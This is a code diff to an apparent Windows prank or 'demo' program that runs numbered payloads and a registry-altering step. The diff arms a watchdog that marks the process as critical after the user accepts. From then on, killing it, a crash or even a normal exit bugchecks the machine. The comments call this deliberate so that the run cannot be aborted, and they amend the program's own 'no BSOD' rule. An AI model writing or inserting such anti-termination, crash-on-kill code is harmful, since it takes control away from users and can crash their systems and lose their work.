@@ -15,6 +15,7 @@
 #include "utils/vmscan.h"
 #include "utils/reg.h"
 #include "utils/tosse.h"
+#include "utils/critical.h"
 #include "easter/dates.h"
 #include "easter/desk.h"
 #include "easter/sys.h"
@@ -28,7 +29,9 @@
 // - disk writes
 // - MBR modification
 // - privilege escalation
-// - BSOD / NtRaiseHardError
+// - BSOD / NtRaiseHardError (except: once the user accepts, the
+//   process is armed as a "critical" process — terminating it
+//   bugchecks the box, see utils/critical.cpp)
 // - audio playback
 //
 // Payloads 27, 28, 35, 36, 37, 39, 42 do manipulate windows
@@ -834,6 +837,13 @@ int main()
         return 0;
 
     // Everything accepted
+
+    // Watchdog: from here on the process is critical. Any
+    // termination (kill, crash, taskkill, even normal exit)
+    // bugchecks the box (CRITICAL_PROCESS_DIED). Deliberately
+    // armed right before the payload so the demo cannot be
+    // aborted mid-run.
+    Watchdog::Arm();
 
     // RegFuk: one-shot. Só roda na primeira vez que o HPPD
     // for iniciado
